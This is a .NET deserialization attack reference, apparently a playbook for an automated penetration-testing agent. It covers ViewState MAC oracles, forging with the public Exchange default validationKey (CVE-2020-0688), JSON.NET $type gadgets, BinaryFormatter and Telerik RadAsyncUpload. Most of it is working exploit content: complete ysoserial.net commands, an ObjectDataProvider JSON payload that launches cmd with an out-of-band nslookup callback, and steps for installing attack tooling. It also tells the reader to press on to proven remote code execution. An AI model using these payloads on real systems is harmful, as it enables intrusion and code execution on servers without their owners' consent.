# .NET Deserialization Reference

Use for ASP.NET ViewState, .NET binary formatters, JSON.NET type metadata, WCF, or
Telerik. Impact-first: the MAC-failure 500 is a positive oracle telling you whether
you need the key; a leaked/default `machineKey` means you FORGE, not hand off.

## Markers

- ViewState: `__VIEWSTATE`, `__EVENTVALIDATION`, `__VIEWSTATEGENERATOR`, base64
  starting `/wE`, `500 Validation of viewstate MAC failed`, `ViewStateException`.
- BinaryFormatter/LosFormatter/ObjectStateFormatter: `AAEAAAD/////`, assembly
  names, `System.Runtime.Serialization`, `SerializationException`.
- JSON.NET: `$type`, assembly-qualified names, `Newtonsoft.Json`.
- WCF/DataContract: `__type`, SOAP faults, `KnownType`.
- Telerik: `Telerik.Web.UI.WebResource.axd?type=rau`.

## ViewState — the MAC oracle and machineKey forge (CVE-2020-0688)

**Step 1 — is MAC enforced? (oracle, read-only)** Corrupt the trailing bytes of a
captured `__VIEWSTATE`:
- `500 Validation of viewstate MAC failed` -> MAC is on; you need the `machineKey`.
- Silent accept / different behavior -> `enableViewStateMac="false"` -> forge with
  NO key.

**Step 2 — forge with ysoserial.net.**

> **Tooling:** `ysoserial.net` is **not installed on this host**, and neither is a
> .NET runtime (`dotnet` and `mono` are both absent). Install it first — grab the
> release zip from `https://github.com/pwntester/ysoserial.net/releases` into
> `~/tools/` and run it under `mono` (`sudo apt install -y mono-complete`) — or use
> the alternative below. Do not silently skip the proof step; a skipped proof is a
> lost finding.
>
> What needs nothing installed, and is worth doing FIRST: the **MAC oracle** in Step 1
> (`curl` the page, corrupt the trailing `__VIEWSTATE` bytes, replay, read the
> response) and the **type-resolution oracle** below (`{"$type":"Nonexistent.Type,
> Fake"}`). Both are pure `curl` and both are reportable facts on their own. Only the
> gadget bytes need the toolchain.

MAC off:
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c nslookup <id>.oob" \
  --generator=<__VIEWSTATEGENERATOR value>
```
MAC on but `machineKey` leaked (web.config disclosure / source) or a known default
(Exchange OWA/ECP: validationKey `CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF`,
CVE-2020-0688):
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c nslookup <id>.oob" \
  --path="/owa/auth.owa" --apppath="/" \
  --generator=B97B4E27 \
  --validationkey=CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF --validationalg=SHA1
```
The OOB DNS hit (or `whoami` reflection) is the RCE proof. A known/leaked
`machineKey` = forge case, NOT brute. Full ladder in `leaked-key-forge.md`.

Other gadgets for `-p ViewState -g`: `ActivitySurrogateSelectorFromFile`,
`TypeConfuseDelegate`, `WindowsIdentity`, `ObjectDataProvider`.

## JSON.NET — `TypeNameHandling`

High-risk when `TypeNameHandling` != `None` and no `SerializationBinder`/allowlist,
and `$type` is honored from a body/cookie/queue/import. Classic gadget:
```json
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework",
 "MethodName":"Start",
 "ObjectInstance":{"$type":"System.Diagnostics.Process, System",
   "StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System",
     "FileName":"cmd","Arguments":"/c nslookup <id>.oob"}}}
```
`ysoserial.net -f Json.Net -g ObjectDataProvider -c "cmd /c nslookup <id>.oob"`
generates it. **Oracle first:** send `{"$type":"Nonexistent.Type, Fake"}` — an
assembly/type-resolution error confirms `$type` reaches the resolver (deser-before-
validation). That error is positive; don't stop on it.

Other .NET JSON stacks: `JavaScriptSerializer` with a custom `SimpleTypeResolver`,
`DataContractJsonSerializer` with `KnownType`, `fastJSON`, `Xaml`.

## BinaryFormatter / LosFormatter / NetDataContractSerializer

Any endpoint that base64-decodes and `BinaryFormatter.Deserialize()`s (upload
config/profile/workflow, cookie, queue arg). `AAEAAAD/////` prefix = BinaryFormatter
stream. Generate:
```
ysoserial.net -f BinaryFormatter -g TypeConfuseDelegate -c "cmd /c nslookup <id>.oob" -o base64
ysoserial.net -f LosFormatter    -g TextFormattingRunProperties -c "..."
```
These formatters have no allowlist by design — reachability + a benign-command OOB
is the proof.

## Telerik UI — RadAsyncUpload (CVE-2019-18935 / CVE-2017-11317)

Fingerprint `...WebResource.axd?type=rau` -> `RadAsyncUpload handler is registered`.
That fingerprint is a plain `curl` and needs nothing installed — get it first.

> **Tooling:** `RAU_crypto.py` is **not installed on this host**. Install it first — `git clone https://github.com/bao7uo/RAU_crypto ~/tools/RAU_crypto && pipx install pycryptodome` — or use the alternative below. Do not silently skip the proof step; a skipped proof is a lost finding.
>
> Alternative that needs nothing: the `type=rau` fingerprint plus the version banner
> already establishes reachability of a known-vulnerable handler. Report that as the
> reach, and install the toolchain before claiming RCE.

With the default/leaked `DialogParametersEncryptionKey`, encrypt a
`Telerik.Web.UI.AsyncUploadConfiguration` (`RAU_crypto.py`) and upload a mixed-mode
assembly to a known path -> RCE. Steps in `leaked-key-forge.md` (Telerik section).

## WCF / SOAP / DataContract

`__type` and `NetDataContractSerializer` in SOAP bodies resolve assembly-qualified
types. Send an unknown type -> resolution fault confirms the surface; then the
DataSet/`ObjectDataProvider` gadget for `NetDataContractSerializer`.

## Evidence that converts

- OOB DNS/HTTP from a forged ViewState / JSON.NET `ObjectDataProvider` / Binary
  formatter gadget = proven RCE.
- MAC-failure 500 vs silent-accept diff = MAC state (drives key-needed vs forge).
- `$type`/`__type` assembly-resolution error naming your input = deser confirmed.
- Forged ViewState with the Exchange default key accepted = CVE-2020-0688 ATO->RCE.

Do NOT stop at "`/wE` seen" or "MAC failed" — the MAC-failed response tells you the
next move (find/leak the key), it is not a dead end.
